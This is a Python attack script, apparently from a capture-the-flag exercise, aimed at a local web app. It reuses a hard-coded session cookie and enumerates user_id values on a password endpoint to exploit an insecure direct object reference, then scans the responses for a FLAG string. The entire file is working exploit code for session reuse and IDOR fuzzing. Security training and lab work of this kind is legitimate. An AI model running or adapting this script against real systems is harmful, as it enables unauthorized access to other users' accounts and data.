import requests
import re

BASE_URL = "http://127.0.0.1:33029"

# Try approach 1: Follow the redirect after auth
print("[*] Approach 1: Follow redirect after auth...")
auth_response = requests.post(
    f"{BASE_URL}/",
    data="username=test&password=test",
    headers={"Content-Type": "application/x-www-form-urlencoded"},
    allow_redirects=True
)

print(f"[+] Final URL after auth: {auth_response.url}")
print(f"[+] Cookies after redirect: {dict(auth_response.cookies)}")

# Get the password/test page directly to see if it sets cookies
print("\n[*] Getting /password/test page directly...")
pw_response = requests.get(f"{BASE_URL}/password/test", allow_redirects=True)
print(f"[+] Status: {pw_response.status_code}")
print(f"[+] URL: {pw_response.url}")
print(f"[+] Cookies: {dict(pw_response.cookies)}")
if pw_response.cookies:
    session_value = pw_response.cookies.get('session')
    print(f"[+] Session: {session_value}")

# Approach 2: Use the session from context
print("\n[*] Approach 2: Using session from context...")
context_session = "eyJ1c2VyX2lkIjoxMDAzMn0.ac6Z5w.L4Dx_bmHgYdRTXc80ol3P3GoeoY"
context_cookies = {'session': context_session}
print(f"[+] Using session: {context_session[:30]}...")

# Test this session
resp = requests.post(
    f"{BASE_URL}/password/test",
    data="password=test&user_id=10032",
    headers={"Content-Type": "application/x-www-form-urlencoded"},
    cookies=context_cookies,
    allow_redirects=False
)

print(f"[+] Response status: {resp.status_code}")
print(f"[+] Location: {resp.headers.get('Location', 'None')}")

# If it worked, we should see a 302 to /dashboard
if resp.status_code == 302 and '/dashboard' in resp.headers.get('Location', ''):
    print("[+] Session from context is VALID!")
    
    # Now do full fuzzing
    print("\n" + "="*60)
    print("[*] FULL IDOR FUZZING WITH VALID SESSION")
    print("="*60)
    
    # Get baseline
    baseline_resp = requests.post(
        f"{BASE_URL}/password/test",
        data="password=test&user_id=10032",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        cookies=context_cookies,
        allow_redirects=False
    )
    baseline_location = baseline_resp.headers.get('Location', '')
    print(f"[+] Baseline (10032): Status={baseline_resp.status_code}, Location={baseline_location}")
    
    test_values = []
    # Adjacent values
    test_values.extend([10030, 10031, 10033, 10034, 10035])
    # Near values
    test_values.extend([10000, 10005, 10010, 10015, 10020, 10025, 10040, 10045, 10050, 10055, 10060])
    # Other ranges
    test_values.extend([1, 10, 100, 1000, 9999, 20000, 99999])
    
    print(f"[+] Testing {len(test_values)} user_id values...\n")
    
    anomalies = []
    for user_id in test_values:
        resp = requests.post(
            f"{BASE_URL}/password/test",
            data=f"password=test&user_id={user_id}",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            cookies=context_cookies,
            allow_redirects=False
        )
        
        location = resp.headers.get('Location', 'N/A')
        
        # Anomaly detection
        is_anomaly = (
            resp.status_code != baseline_resp.status_code or
            location != baseline_location or
            resp.status_code == 200  # Different behavior (no redirect)
        )
        
        status = "[!] ANOMALY" if is_anomaly else "-"
        print(f"user_id={user_id}: Status={resp.status_code}, Location={location} [{status}]")
        
        if is_anomaly:
            anomaly = {
                'user_id': user_id,
                'status': resp.status_code,
                'location': location,
                'content_snippet': resp.text[:500] if resp.status_code == 200 else 'N/A'
            }
            anomalies.append(anomaly)
    
    # Summary
    print("\n" + "="*60)
    print("[*] FUZZING SUMMARY")
    print("="*60)
    print(f"[+] Total tested: {len(test_values)}")
    print(f"[+] Anomalies found: {len(anomalies)}")
    
    if anomalies:
        print("\n[!] ANOMALOUS RESPONSES:")
        for a in anomalies:
            print(f"\n  user_id={a['user_id']}: Status={a['status']}, Location={a['location']}")
            if a['content_snippet'] != 'N/A':
                # Look for FLAG
                flag_match = re.search(r'FLAG\{[^}]+\}', a['content_snippet'])
                if flag_match:
                    print(f"  [!] FLAG: {flag_match.group(0)}")
                print(f"  Content: {a['content_snippet'][:300]}...")
    else:
        print("[-] No anomalies detected - all responses identical")
        
else:
    print("[-] Session from context failed")
    print("Response body:")
    print(resp.text[:500])

